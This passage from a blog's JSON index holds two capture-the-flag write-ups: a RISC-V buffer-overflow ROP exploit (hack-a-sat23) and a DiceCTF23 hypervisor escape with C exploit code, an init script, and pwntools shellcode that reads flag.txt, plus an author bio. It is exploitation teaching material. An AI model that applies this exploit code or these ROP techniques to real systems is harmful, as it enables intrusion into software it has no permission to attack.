read(0,\u0026amp;control_chr,1); if (nread != 1) return -1; //`control_chr` can be one of the following: // \u0026#39;\\xa1\u0026#39;, \u0026#39;\\xa2\u0026#39;, \u0026#39;\\xb1\u0026#39;, \u0026#39;\\xb2\u0026#39; //only \u0026#39;\\xb2\u0026#39; is relevant to us. if (control_chr == \u0026#39;\\xb2\u0026#39;) { return do_b2(); } else { //... } return -1; } int do_b2() { char acstack_78 [100]; if (read(0,acstack_78,sz) \u0026lt; 300) { //!!! bug: bufferoverflow here. return -1; } if (check_message_crc(acstack_78,300) == -1) //dumb crc32 check. last 4 bytes of input is the crc32. return -1; return 0; } here are the juicy parts from the code above:\nthe binary reads two environment variables: flag and timeout. timeout is (classically) used to prevent us from leaving open connections to the remote (nothing fancy). if not specified, it defaults to 10 seconds, so for our exploitation we will set it to something much higher (3600). flag environment variable contains the flag value and writes it to the file flag.txt the unsetenv(\u0026quot;flag\u0026quot;) function simply unsets the environment variable. however, it does not erase the memory. it simply shifts the all the elements in the char *environ[] array to the left by 1 (setenv.c#264). this means that the flag is still somewhere down the stack. syncronize() is a boring state machine. required input is \\xde\\xad\\xbe\\xef. read_message() is where the program will read commands from us. command b2 reads 300 bytes into a buffer of 100 bytes. this is a buffer overflow. now that we have identified the location of the buffer overflow and how to reach it, it is time to come up with a strategy to pwn the binary.\ndetour to risc-v architecture and abi before we attempt to exploit this buffer overflow, we need to understand our target architecture. more specifically:\nwhat is the function call convention? how are arguments passed to functions? how is the control flow transferred to a function how does a function return to its caller what is the syscall abi? how are arguments passed to syscalls how does the stack behave? which are caller/callee saved registers? which are our registers? how does the assembly of risc-v look like? how do we access memory? only if we know the answer to the above questions we can start thinking about exploiting and roping. otherwise, we simply do not know how to control the program counter, how gadgets look like, and how to chain them together!\nregisters all register definitions\ndatatypes function call convention function call convention risc-v has a little-endian memory system. in the standard risc-v calling convention, the stack grows downward and the stack pointer is always kept 16-byte aligned. function arguments are passed arguments in registers when possible. up to eight integer registers, a0-a7 return value is passed in registers a0 and a1. here is a simple example compiled using godbolt.org:\nint myfunc(int arg) { int i; i=arg+0x20; return i; } int main() { myfunc(0x10); return 0; } myfunc(int)-0x2: nop r_riscv_align *abs*+0x2 myfunc(int): addi\tsp,sp,-16\t# allocate stack sw\tra,12(sp)\t# store return address sw\ts0,8(sp)\t# store frame pointer addi\ts0,sp,16\t# s0=sp sw\ta0,-12(s0)\t# save arg0 # do the opration lw\ta0,-12(s0) addi\ta0,a0,0x20 sw\ta0,-16(s0) # return lw\ta0,-16(s0)\t# return value lw\tra,12(sp)\t# return address lw\ts0,8(sp)\t# restore frame pointer addi\tsp,sp,16\t# deallocate stack ret\t# pseudo-instruction: jalr x0, ra, 0 main: addi\tsp,sp,-16 sw\tra,12(sp) sw\ts0,8(sp) addi\ts0,sp,16 li\ta0,0 sw\ta0,-16(s0) sw\ta0,-12(s0) # prepare for function call to myfunc() li\ta0,0x10\t# setup arg1 # compute address of myfunc using relative addressing # and then call it using jalr auipc\tra,0x0 r_riscv_call_plt myfunc(int) r_riscv_relax *abs* jalr\tra\t# 3a \u0026lt;main+0x14\u0026gt; lw\ta0,-16(s0) lw\tra,12(sp) lw\ts0,8(sp) addi\tsp,sp,16 ret other risc-v assembly programmer\u0026rsquo;s manual - very good resource. risc-v instruction set cheatsheet risc-v instruction set reference pseudo-instructions assembler directives relative/absolute addressing, labels, got accessing load \u0026amp; store pwning now that we know our architecture, let\u0026rsquo;s identify the binary\u0026rsquo;s security properties and come up with an exploitation strategy:\nnikos@ctf-box:~$ checksec --file=./drop-baby [*] \u0026#39;~/drop-baby\u0026#39; arch: riscv-32-little relro: partial relro stack: no canary found nx: nx enabled pie: no pie (0x10000) great, no pie!. let\u0026rsquo;s search for useful gadgets using ropgadget. generally, we want to control:\na0,a1,a2,... when making function calls as these are the argument registers ra as this is the return address where a function call should return when finished find jr and jalr gadgets as these will compose our rop chain. also, we notice in the disassembly that many instructions start with the c. prefix. these are compressed 16-bit instructions (rcv) instead of the regular 32-bit instructions and are referred in the \u0026ldquo;c\u0026rdquo; standard extension for compressed instructions in the risc-v isa:\nthe \u0026ldquo;c\u0026rdquo; extension can be added to any of the base isas (rv32,\nrv64, rv128), and we use the generic term “rvc” to cover any of these. typically, 50%–60% of the risc-v instructions in a program can be replaced with rvc instructions, resulting in a 25%–30% code-size reduction.\nrvc uses a simple compression scheme that offers shorter 16-bit versions of common 32-bit risc-v instructions\nthe c extension is compatible with all other standard instruction extensions. the c extension allows 16-bit instructions to be freely intermixed with 32-bit instructions, with the latter now able to start on any 16-bit boundary.\nhere is a one liner to search for gadgets in our binary:\nropgadget --binary drop-baby --align 4 \\ | grep -e \u0026#39;sw|swsp|lw|lwsp|mv|sub|add|xor|jr|jalr|ret|ecall\u0026#39; \\ | grep -e \u0026#39;; (ret)|((c\\.)?j(al)?r (x[0-9]{1,2}|zero|ra|sp|gp|tp|s[0-9]{1,2}|t[0-6]|fp|a[0-7]))$\u0026#39; \\ | tee gadgets.log the first regex will filter gadgets that have only relevant opcodes to us. the second regex is about how the gadget should end. all of our gadgets will end with either jr or jalr with a register as argument. ret is the same as jalr x0, ra, 0 ret is the same as jr ra if we are doing function calls, we want our gadgets to not end with j(al)?r ra. this is because the function call will use the ra register in the ret instruction to return to our next rop gadget. we are interested in the lwsp gadgets as these gadgets can directly load values from the stack (which we control) into our registers ecall is uses for invoking syscalls, but we have libc statically linked so we don\u0026rsquo;t use it. since our binary supports the c. prefix, we can also --align 2 instead of 4. here are some example good quality gadgets:\n# control a bunch or registers 0x0001a7e8: c.lwsp ra, 0x2c(sp) ; c.lwsp s0, 0x28(sp) ; c.lwsp s1, 0x24(sp) ; c.lwsp s2, 0x20(sp) ; c.lwsp s3, 0x1c(sp) ; c.lwsp s5, 0x14(sp) ; c.lwsp s6, 0x10(sp) ; c.lwsp s7, 0xc(sp) ; c.lwsp s8, 8(sp) ; c.mv a0, s4 ; c.lwsp s4, 0x18(sp) ; c.addi16sp sp, 0x30 ; c.jr ra # control a0, a1, a2 function arguments 0x00026900: c.lwsp a2, 0x10(sp) ; c.lwsp a1, 0x18(sp) ; c.lwsp a0, 0x14(sp) ; c.mv a5, s8 ; c.li a6, 0 ; c.li a4, 0 ; c.mv a3, s6 ; c.jalr s0 # gadget that does not use `ra` to jump. # instead, it controls `ra`, so we can return from a function call back # to our rop chain. 0x0001a410: c.lwsp ra, 0x1c(sp) ; c.addi16sp sp, 0x20 ; c.jr a5 with the lwsp instructions we can load arbitrary values into registers and with the addi16sp we can increase the stack pointer. the jr and jalr use a register to jump, whcih we we can control with lwsp, and thus we can link gadgets togeather.\nnow for the rop chain payload we have two solutions:\nsolution-cheesy.py - abuses the fact that the flag is still somewhere in the stack. it finds the address of the flag in the stack and then does puts(flag). solution.py - more hardcore rop solution. it performs the following function calls with a rop chain: fd=open(\u0026#34;flag.txt\u0026#34;, o_rdonly); read(fd, buf, 0x100); write(1, buf, 0x100); //write to stdout after each function call, we re-trigger the buffer overflow as the whole rop chain does not fit into the 300 bytes that we can write. when we execute our rop chain, we get the flag!\n","title":"ROPing on RISC-V - hack-a-sat23"},{"date":"2023-02-10","image":"/post-resources/pacman.png","imageAlt":"","link":"https://chalkiadakis.me/posts/dicectf23/dice-visor/","summary":"Surviving the trip from userland, to kernel, to hypervisor.","tags":["ctf","diceCTF","hypervisor","pwn"],"text":"categories: pwn\ndescription:\nwelcome to dicegang\u0026rsquo;s newest hypervisor-based security solution, dicer-visor.\nnc mc.ax 31313\nauthor: smoothhacker\ninitramfs.cpio.gz dicer-visor bzimage\nrecon for this challenge, we are given 3 files: a kernel image, an initramfs, and the dicer-visor binary which is the hypervisor itself.\nfane@ctf-box:~/dicer-visor$ file dicer-visor dicer-visor: elf 64-bit lsb pie executable, x86-64, version 1 (sysv), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, buildid[sha1]=f9ef7fc5756088242c50b7f6b1dbee7ccee624de, for gnu/linux 3.2.0, not stripped fane@ctf-box:~/dicer-visor$ ./dicer-visor usage: ./dicer-visor \u0026lt;bzimage\u0026gt; \u0026lt;initrd\u0026gt; let\u0026rsquo;s run the challenge locally:\nfane@ctf-box:~/dicer-visor$ ./dicer-visor bzimage initramfs.cpio.gz dicer-visor - dicegang security hypervisor [*] created vm [*] loaded kernel image: bzimage [*] loaded initrd image: initramfs.cpio.gz [*] starting up vm booting from rom... [ 0.000000] linux version 6.0.0 (scott@blackrock) (gcc (ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0, gnu 3 [ 0.000000] command line: console=ttys0 nokaslr [ 0.000000] x86/fpu: supporting xsave feature 0x001: \u0026#39;x87 floating point registers\u0026#39; [ 0.000000] x86/fpu: supporting xsave feature 0x002: \u0026#39;sse registers\u0026#39; ... [ 0.468004] run /init as init process /init: line 7: can\u0026#39;t create /sys/module/rcutree/parameters/rcu_cpu_stall_suppress: nonexistent directy [ 0.528008] vuln: loading out-of-tree module taints kernel. [ 0.532008] [!] vulnerable driver loaded /bin/sh: can\u0026#39;t access tty; job control turned off / # uname -a linux (none) 6.0.0 #15 fri feb 3 13:31:55 utc 2023 x86_64 gnu/linux / # so, the binary spawns a vm with the given initramfs and drops us to a shell. the vm is running a kernel version 6.0.0 and from the logs we also see that it loads a weird kernel module ([!] vulnerable driver loaded). inside the initramfs, we find the vuln.ko kernel module which we will analyze in a bit. we also can see the contents of init:\n/ # cat init #!/bin/sh #mount -t proc none /proc #mount -t sysfs none /sys #mount -t debugfs none /sys/kernel/debug echo 1 \u0026gt; /sys/module/rcutree/parameters/rcu_cpu_stall_suppress /sbin/insmod /vuln.ko mknod /dev/exploited-device c 32 0 exec /bin/sh / # interesting! the vuln.ko kernel module is loaded and the character device /dev/exploited-device is created. but what is the exploitation strategy here? probably we need to interact with vuln.ko from inside the vm, which in turn will interact with the hypervisor, and we have to exploit that latter interaction. let\u0026rsquo;s also try running on remote:\nwhen we connect to the remote, it asks us for a url to download an initramfs and then spawns the vm. when providing the original initramfs, after the vm loads, we get a kernel panic, probably crashing at exec /bin/sh in init. this is because on the remote side they probably have deleted the contents of /bin/* to avoid easy exploitation. so, let\u0026rsquo;s start analyzing the challenge files.\nanalysis - vuln.ko first, let\u0026rsquo;s extract the initramfs and load the vuln.ko in ghidra. we first analyze the entry and exit points of the kernel module which are init_module and cleanup_module respectively:\nvoid init_module(void) { long lvar1; __register_chrdev(0x20,0,0x100,\u0026#34;exploited-device\u0026#34;,fops); lvar1 = __request_region(\u0026amp;ioport_resource,0xdead,1,\u0026#34;exploited-device\u0026#34;,0); if (lvar1 == 0) { _printk(\u0026#34;\\x011[!] io port allocation of 0x%x failed\\n\u0026#34;,0xdead); } else { lvar1 = __request_region(\u0026amp;ioport_resource,0xd1ce,1,\u0026#34;exploited-device\u0026#34;,0); if (lvar1 == 0) { _printk(\u0026#34;\\x011[!] io port allocation of 0x%x failed\\n\u0026#34;,0xd1ce); } else { _printk(\u0026#34;\\x011[!] vulnerable driver loaded\\n\u0026#34;); } } __x86_return_thunk(); return; } void cleanup_module(void) { __x86_return_thunk(); return; } as we can see, the init_module creates the character device /dev/exploited-device with major number 32, base minor 0, and 0x100 minor numbers available to it (docs/__register_chrdev). next, it creates to regions for this device, both with size 1 byte. the first region is ad address 0xdead and the second region at address 0xd1ce (docs/__request_region).\nthe fops variable in __register_chrdev(), is a global variable that defines what operations are allowed on the character devices and how it should behave under these operations. usually, userland applications interact with the device through the /dev filesystem and file descriptors. from the init file, you should recall the line mknod /dev/exploited-device c 32 0, which makes a special character device with the same major and minor numbers as in the __register_chrdev() call.\nback to the fops variable. this variable is of type struct file_operations and is basically a big list of function pointers. these function pointers describe how the character device behaves when interacted as a file through /dev/exploited-device, e.g. via open, read, ioctl, etc.\nso, let\u0026rsquo;s examine all the registered function pointers in fops:\nchar shellcode[256]; //global variable int open(struct inode *, struct file *) { return 0; } void release(struct inode *, struct file *) { return 0; } ssize_t read(struct file *, char __user *, size_t, loff_t *) { return 0; } ssize_t write(struct file *, const char __user * __buf, size_t __n, loff_t *) { size_t copy_sz; ssize_t svar1; copy_sz = min(__n, 0x100); _copy_from_user(shellcode,__buf,copy_sz); svar1 = __x86_return_thunk(); return svar1; } void tl_ioctl(struct file *file, unsigned int cmd, unsigned long) { long i; _printk(\u0026#34;\\x011[!] driver ioctl issued - cmd: %d\\n\u0026#34;, cmd); if (cmd == 0xbeef) { out(0xd1ce,0xd1ce); //out dx,ax native_io_delay(); } else if (cmd == 0xdead) { for(i=0; i\u0026lt;0x100; i++) { out(0xdead,shellcode[i]); //out dx,al native_io_delay(); } } return 0; } so, to summarize the above operations:\nopen: noop. release: noop read: noop write: writes to the global shellcode kernel buffer up to 0x100 bytes provided by the userland buf. ioctl: the out that appear in the body of the function, are x86-specific assembly instructions. these instructions are used for port i/o, i.e. communication with hardware peripherals. since we are running inside a vm, we expect that these instructions will cause a trap to the hypervisor. (usually the vm runs at a lower privilege level than these instructions can be executed [1, 2, 3]) so, the ioctl command 0xbeef writes to the i/o port 0xd1ce the value d1ce; and the iotctl command 0xdead writes to the i/o port 0xdead the shellcode buffer (0x100 bytes). now it\u0026rsquo;s time to analyze the hypervisor!\nanalysis - dice-visor fane@ctf-box:~/dicer-visor$ file dicer-visor dicer-visor: elf 64-bit lsb pie executable, x86-64, version 1 (sysv), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, buildid[sha1]=f9ef7fc5756088242c50b7f6b1dbee7ccee624de, for gnu/linux 3.2.0, not stripped fortunately, the hypervisor still has symbols as it is not stripped. let\u0026rsquo;s start the analysis from the main function:\nint main(int argc,char **argv) { int ivar1; char *err_msg; int aistack72 [2]; int fd; setvbuf(stdout,(char *)0x0,2,0); setvbuf(stdin,(char *)0x0,2,0); setvbuf(stderr,(char *)0x0,2,0); if (argc != 3) { fwrite(\u0026#34;usage: ./dicer-visor \u0026lt;bzimage\u0026gt; \u0026lt;initrd\u0026gt;\\n\u0026#34;,0x28,1,stderr); return -1; } puts(\u0026#34;dicer-visor - dicegang security hypervisor\u0026#34;); fd = open(\u0026#34;/dev/kvm\u0026#34;,0x80002); if (fd == -1) { return err(1, \u0026#34;/dev/kvm\u0026#34;); } else { ivar1 = ioctl(fd,0xae00,0); if (ivar1 == 0xc) { init_vm(aistack72); puts(\u0026#34;[*] created vm\u0026#34;); load_vm((long)aistack72,argv[1],argv[2]); printf(\u0026#34;[*] loaded kernel image: %s\\n\u0026#34;,argv[1]); printf(\u0026#34;[*] loaded initrd image: %s\\n\u0026#34;,argv[2]); puts(\u0026#34;[*] starting up vm\u0026#34;); run_vm(aistack72); cleanup_vm(aistack72); puts(\u0026#34;[*] exited vm\u0026#34;); return 0; } else if (ivar1 != -1) { return err(1,\u0026#34;kvm_get_api_version %d, expected 12\u0026#34;,ivar1); } return err(1, \u0026#34;kvm_get_api_version\u0026#34;); } } as we see, the hypervisors uses the kernel\u0026rsquo;s kvm api to create the virtual machine. init_vm performs a lot of ioctl system calls, while load_vm does not perform any ioctl and simply mmaps the bzimage and the initramfs, sets some state variables in aistack72, and then returns. the value 0xae00 in the ioctl, corresponds to the #define kvm_get_api_version _io(kvmio, 0x00), where kvmio holds the value 0xae. with a little bit of manual reverse engineering effort, we recover the struct for aistack72 and also have a clean decompilation of the whole hypervisor:\n// ghidra-kvm.h contains struct definitions and macro #defines related to the kvm api. // extracted from the source code of the linux kernel. // e.g. from https://elixir.bootlin.com/linux/v6.0/source/include/uapi/linux/kvm.h // consult the kernel source code and its documentation for what the structs are. // file located in solution/ghidra-kvm.h #include \u0026#34;ghidra-kvm.h\u0026#34; struct vm { int vm_fd; int vcpu_fd; int kvm_fd; undefined[4] padding; void *userspace_address; } undefined8 init_vm(struct vm *vm); undefined8 load_vm(struct vm *vm,char *bzimage_path,char *initramfs_path); undefined8 run_vm(struct vm *vm); undefined8 cleanup_vm(struct vm *vm); int main(int argc,char **argv) { int ivar1; char *pcvar2; struct vm vm; setvbuf(stdout,(char *)0x0,2,0); setvbuf(stdin,(char *)0x0,2,0); setvbuf(stderr,(char *)0x0,2,0); if (argc != 3) { fwrite(\u0026#34;usage: ./dicer-visor \u0026lt;bzimage\u0026gt; \u0026lt;initrd\u0026gt;\\n\u0026#34;,0x28,1,stderr); return -1; } puts(\u0026#34;dicer-visor - dicegang security hypervisor\u0026#34;); vm.kvm_fd = open(\u0026#34;/dev/kvm\u0026#34;,0x80002); if (vm.kvm_fd == -1) { return err(1, \u0026#34;/dev/kvm\u0026#34;); } else { ivar1 = ioctl(vm.kvm_fd,kvm_get_api_version ,0); if (ivar1 == 0xc) { init_vm(\u0026amp;vm); puts(\u0026#34;[*] created vm\u0026#34;); load_vm(\u0026amp;vm,argv[1],argv[2]); printf(\u0026#34;[*] loaded kernel image: %s\\n\u0026#34;,argv[1]); printf(\u0026#34;[*] loaded initrd image: %s\\n\u0026#34;,argv[2]); puts(\u0026#34;[*] starting up vm\u0026#34;); run_vm(\u0026amp;vm); cleanup_vm(\u0026amp;vm.vm_fd); puts(\u0026#34;[*] exited vm\u0026#34;); return 0; } else if (ivar1 != -1) { return err(1,\u0026#34;kvm_get_api_version %d, expected 12\u0026#34;,ivar1); } return err(1,\u0026#34;kvm_get_api_version\u0026#34;); } } /* warning: could not reconcile some variable overlaps */ undefined8 init_vm(struct vm *vm) { int ivar1; void *userspace_addr; char *pcvar2; undefined8 local_70; struct kvm_userspace_memory_region kvm_userspace_memory_region; kvm_pit_config kvm_pit_config; ivar1 = ioctl(vm-\u0026gt;kvm_fd,kvm_create_vm ,0); vm-\u0026gt;vm_fd = ivar1; if (ivar1 \u0026lt; 0) { pcvar2 = \u0026#34;[!] vm creation failed\u0026#34;; } else { ivar1 = ioctl(ivar1,kvm_set_tss_addr,0xfffbd000); if (ivar1 \u0026lt; 0) { pcvar2 = \u0026#34;[!] failed to set tss addr\u0026#34;; } else { local_70 = 0xffffc000; ivar1 = ioctl(vm-\u0026gt;vm_fd,kvm_set_identity_map_addr,\u0026amp;local_70); if (ivar1 \u0026lt; 0) { pcvar2 = \u0026#34;[!] failed to set identity map addr\u0026#34;; } else { ivar1 = ioctl(vm-\u0026gt;vm_fd,kvm_create_irqchip,0); if (ivar1 \u0026lt; 0) { pcvar2 = \u0026#34;[!] failed to create irq chip\u0026#34;; } else { kvm_pit_config.pad._44_16_ = zext816(0); kvm_pit_config.pad._28_16_ = zext816(0); kvm_pit_config.pad._12_16_ = zext816(0); kvm_pit_config._0_16_ = zext816(0); ivar1 = ioctl(vm-\u0026gt;vm_fd,kvm_create_pit2,\u0026amp;kvm_pit_config); if (ivar1 \u0026lt; 0) { pcvar2 = \u0026#34;[!] failed to create i8254 interval timer\u0026#34;; } else { userspace_addr = mmap(null,0x10000000,3,0x4021,-1,0); vm-\u0026gt;userspace_address = userspace_addr; if (userspace_addr == null) { pcvar2 = \u0026#34;[!] failed to mmap vm memory\u0026#34;; } else { kvm_userspace_memory_region._0_8_ = 0x100000000; kvm_userspace_memory_region.guest_phys_addr._0_4_ = 0; kvm_userspace_memory_region.guest_phys_addr._4_4_ = 0; kvm_userspace_memory_region.memory_size._0_4_ = 0x10000000; kvm_userspace_memory_region.memory_size._4_4_ = 0; kvm_userspace_memory_region.userspace_addr = (ulong)userspace_addr; ivar1 = ioctl(vm-\u0026gt;vm_fd,kvm_set_user_memory_region,\u0026amp;kvm_userspace_memory_region); if (ivar1 \u0026lt; 0) { pcvar2 = \u0026#34;[!] failed to set user memory region\u0026#34;; } else { ivar1 = ioctl(vm-\u0026gt;vm_fd,kvm_create_vcpu,0); vm-\u0026gt;vcpu_fd = ivar1; if (-1 \u0026lt; ivar1) { initvmregs(vm); createcpuid(vm); return 0; } pcvar2 = \u0026#34;[!] failed to create vcpu\u0026#34;; } } } } } } } err(1,pcvar2); } void *jit_mem; int jit_mem_counter; undefined8 run_vm(struct vm *vm) { int ivar1; kvm_run *vcpu; long idx; undefined seccomp_filter[]; //length omitted ushort port; ivar1 = ioctl(vm-\u0026gt;kvm_fd,kvm_get_vcpu_mmap_size,0); vcpu = (kvm_run *)mmap(null,ivar1,prot_read|prot_write,map_shared,vm-\u0026gt;vcpu_fd,0); jit_mem = (code *)mmap(null,0x100,prot_read|prot_write|proc_exec, map_shared|map_anonymous|map_noreserve,-1,0 ); jit_mem_counter = 0; /* init seccomp_filter */ /* ... */ //set seccomp filter ivar1 = prctl(pr_set_no_new_privs,1,0,0,0); if (ivar1 != 0) { perror(\u0026#34;prctl(no_new_privs)\u0026#34;); } ivar1 = prctl(pr_set_seccomp,2,seccomp_filter); if (ivar1 != 0) { close(vm-\u0026gt;vcpu_fd); close(vm-\u0026gt;vm_fd); close(vm-\u0026gt;kvm_fd); munmap(vm-\u0026gt;userspace_address,0x40000000); perror(\u0026#34;prctl(seccomp)\u0026#34;); //bug? if the seccomp filter fails, then we still attempt to execute the remaining of this function. //but the file descriptors have been closed and memory has been unmapped. oh well.. } //run the vm ivar1 = ioctl(vm-\u0026gt;vcpu_fd,kvm_run,0); while( true ) { if (ivar1 \u0026lt; 0) { return err(1,\u0026#34;kvm_run failed\u0026#34;); } if (vcpu-\u0026gt;exit_reason != kvm_exit_io) break; /* union case: kvm_exit_io */ port = vcpu-\u0026gt;unlabelled32.io.port; //vcpu-\u0026gt;unlabelled32.io.port if ((short)port \u0026lt; 0x61) { if (port == 0xd1ce) { (*jit_mem)(); } else if ((port == 0xdead) \u0026amp;\u0026amp; (vcpu-\u0026gt;unlabelled32.io.direction == kvm_exit_io_out)) { idx = (long)jit_mem_counter; if (idx \u0026lt;= 0x100) { //unintended off-by-one. jit_mem_counter++; jit_mem[idx] = *((char*)vcpu + vcpu-\u0026gt;unlabelled32.io.data_offset); } else { puts(\u0026#34;[!] maximum bytes read from guest\u0026#34;); } } } else if (port == 0x61 \u0026amp;\u0026amp; vcpu-\u0026gt;unlabelled32.io.direction == kvm_exit_io_in) { *((char*)vcpu + vcpu-\u0026gt;unlabelled32.io.data_offset) = \u0026#39;d\u0026#39;; } else if (port == 0x3fd \u0026amp;\u0026amp; vcpu-\u0026gt;unlabelled32.io.direction == kvm_exit_io_in) { *((char*)vcpu + vcpu-\u0026gt;unlabelled32.io.data_offset) = \u0026#39; \u0026#39;; } else if ((port == 0x3f8) \u0026amp;\u0026amp; (vcpu-\u0026gt;unlabelled32.io.direction == kvm_exit_io_out)) { write(1, (char*)vcpu + vcpu-\u0026gt;unlabelled32.io.data_offset, 1); } ivar1 = ioctl(vm-\u0026gt;vcpu_fd,kvm_run,0); //continue the vm } printf(\u0026#34;[!] unknown exit reason: %d\\n\u0026#34;, vcpu-\u0026gt;exit_reason); return -1; } undefined8 cleanup_vm(struct vm *vm) { close(vm-\u0026gt;vcpu_fd); close(vm-\u0026gt;vm_fd); close(vm-\u0026gt;kvm_fd); munmap(vm-\u0026gt;userspace_address,0x40000000); return 0; } the run_vm now is quite self-explanatory and interesting. as we recall from the vuln.ko, there were two out x86 instructions that we could invoke: out(0xd1ce,0xd1ce) and out(0xdead,shellcode[i]). from the hypervisor\u0026rsquo;s code, we can see that when the port is 0xd1ce, the contents of the jit_mem are executed. when the port is 0xdead, we write to the jit_mem the value of the source operand from the out x86 instructions. so, to sum it up:\nwrite syscall to the /dev/exploited-device: writes up to 0x100 bytes to the kernel\u0026rsquo;s shellcode buffer from a userland provided buffer. ioctl cmd 0xdead: out(0xdead, shellcode[i]). writes the 0x100 bytes from the kernel\u0026rsquo;s shellcode buffer to the hypervisor\u0026rsquo;s jit_mem. may be called only once. (otherwise you get the message \u0026ldquo;maximum bytes read from guest\u0026rdquo;.) ioctl cmd 0xbeef: out(0xd1ce,0xd1ce). will execute the contents in the jit_mem buffer. i.e. it will execute the shellcode provided from userland. seccomp filter one last thing to notice about run_vm, is that it sets up a seccomp filter. using seccomp-tools, we can easily dump it:\nfane@ctf-box:~/dicer-visor$ seccomp-tools dump \u0026#34;./dicer-visor bzimage initramfs.cpio.gz\u0026#34; dicer-visor - dicegang security hypervisor [*] created vm [*] loaded kernel image: bzimage [*] loaded initrd image: initramfs.cpio.gz [*] starting up vm line code jt jf k ================================= 0000: 0x20 0x00 0x00 0x00000004 a = arch 0001: 0x15 0x01 0x00 0xc000003e if (a == arch_x86_64) goto 0003 0002: 0x06 0x00 0x00 0x00000000 return kill 0003: 0x20 0x00 0x00 0x00000000 a = sys_number 0004: 0x15 0x00 0x01 0x00000029 if (a != socket) goto 0006 0005: 0x06 0x00 0x00 0x80000000 return kill_process 0006: 0x15 0x00 0x01 0x00000039 if (a != fork) goto 0008 0007: 0x06 0x00 0x00 0x80000000 return kill_process 0008: 0x15 0x00 0x01 0x00000021 if (a != dup2) goto 0010 0009: 0x06 0x00 0x00 0x80000000 return kill_process 0010: 0x15 0x00 0x01 0x00000142 if (a != execveat) goto 0012 0011: 0x06 0x00 0x00 0x80000000 return kill_process 0012: 0x06 0x00 0x00 0x7fff0000 return allow so, this is a blacklist of socket, fork, dup2, and execveat system calls. however, we can still use open and write, and the remote provides us the output of the hypervisor!\nexploitation so, let\u0026rsquo;s create a userland program that when executed performs the trip to the hypervisor and executes some shellcode:\n//main.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; const char *shellcode = \u0026#34;\\x90\\x90\\x90\\x90\u0026#34;; //4x \u0026#34;nop\u0026#34; instruction const size_t shellcode_len = 4; int main(int argc, char ** argv) { int fd = open(\u0026#34;/dev/exploited-device\u0026#34;, o_rdwr); if(fd == -1) { perror(\u0026#34;open\u0026#34;); exit(1); } ssize_t res = write(fd, shellcode, shellcode_len); if(res != shellcode_len) { printf(\u0026#34;write error. written: %ld\\n\u0026#34;, res); exit(1); } if ( (res = ioctl(fd, 0xdead)) \u0026lt; 0) { //write shellcode to supervisor perror(\u0026#34;ioctl1\u0026#34;); exit(1); } if ( (res = ioctl(fd, 0xbeef)) \u0026lt; 0) { //invoke shellcode perror(\u0026#34;ioctl2\u0026#34;); exit(1); } return 0; } next, let\u0026rsquo;s write a script that builds our userland program and re-creates the initramfs:\n#!/bin/sh set -e gcc -static main.c -o main mv main initramfs cd initramfs find . -print0 | cpio --null --create --verbose --format=newc | gzip --best \u0026gt; ../initramfs_patched.cpio.gz cd - finally, we modify the init script to invoke our main program when the kernel boots:\n#!/bin/sh echo 1 \u0026gt; /sys/module/rcutree/parameters/rcu_cpu_stall_suppress echo \u0026#34;hello kernel world!\u0026#34; /sbin/insmod /vuln.ko mknod /dev/exploited-device c 32 0 chmod ugo+x /main exec /main shellcode generation to generate our shellcode and dump the flag, we use pwntools\n# gen-shellcode.py from pwn import * # set up pwntools for the correct architecture. context.binary = elfexe = elf(\u0026#39;./dicer-visor\u0026#39;) def dumpshellcode(shellcode): shellcode_str = \u0026#39;\u0026#39; for b in shellcode: shellcode_str += \u0026#34;\\\\x{:02x}\u0026#34;.format(b) msg = f\u0026#39;const char *shellcode = \u0026#34;{shellcode_str}\u0026#34;;\\n\u0026#39; msg += f\u0026#39;const size_t shellcode_len = {len(shellcode)};\u0026#39; print(msg) shellcode = asm( \u0026#39;\u0026#39;\u0026#39; xor rdx, rdx /* o_rdonly */ \u0026#39;\u0026#39;\u0026#39; + pwnlib.shellcraft.linux.cat(\u0026#34;flag.txt\u0026#34;) ) dumpshellcode(shellcode) when we execute python gen-shellcode.py, we get our c-style formatted shellcode which we can plug into our main.c:\nfane@ctf-box:~/dicer-visor$ python gen-shellcode.py const char *shellcode = \u0026#34;\\x48\\x31\\xd2\\x6a\\x01\\xfe\\x0c\\x24\\x48\\xb8\\x66\\x6c\\x61\\x67\\x2e\\x74\\x78\\x74\\x50\\x6a\\x02\\x58\\x48\\x89\\xe7\\x31\\xf6\\x0f\\x05\\x41\\xba\\xff\\xff\\xff\\x7f\\x48\\x89\\xc6\\x6a\\x28\\x58\\x6a\\x01\\x5f\\x99\\x0f\\x05\u0026#34;; const size_t shellcode_len = 47; getting the flag finally we run build.sh to create the initramfs_patched.cpio.gz that contains the modified init script and our main binary. when we connect to the remote and provide our initramfs_patched.cpio.gz for the hypervisor to use, our userland program gets executed when the kernel boots, we perform the trip to the hypervisor, and dump the contents of flag.txt!\ndice{dicer-visor-rules}\n","title":"Pwning a hypervisor - DiceCTF23"},{"date":"0001-01-01","image":"","imageAlt":"","link":"https://chalkiadakis.me/whoami/","summary":"Hi! I am Nikolaos Chalkiadakis (aka \u0026ldquo;nikosChalk\u0026rdquo; or \u0026ldquo;Fane\u0026rdquo;) and I am a Security Analyst @ Riscure! I am currently active in the mobile security and mobile payments landscapes. I have extended knowledge in Android internals, mobile pentesting, reverse engineering (static \u0026amp; dynamic analysis), binary exploitation, and kernel development. As you can probably already tell, I really enjoy low-level stuff.\nOccasional CTF player (pwn/rev/web)\nGeographically located in 🇳🇱, with a soul belonging to 🇬🇷🏖️⛷️🥤","tags":[],"text":" hi! i am nikolaos chalkiadakis (aka \u0026ldquo;nikoschalk\u0026rdquo; or \u0026ldquo;fane\u0026rdquo;) and i am a security analyst @ riscure! i am currently active in the mobile security and mobile payments landscapes. i have extended knowledge in android internals, mobile pentesting, reverse engineering (static \u0026amp; dynamic analysis), binary exploitation, and kernel development. as you can probably already tell, i really enjoy low-level stuff.\noccasional ctf player (pwn/rev/web)\ngeographically located in 🇳🇱, with a soul belonging to 🇬🇷🏖️⛷️🥤\neducation 2023 | m.sc. in computer science 9.00/10.0 | vu amsterdam, uva \u0026nbsp; (netherlands) thesis: spaceforce: spatial and partially temporal heap protection with tagged buffed pointers @ 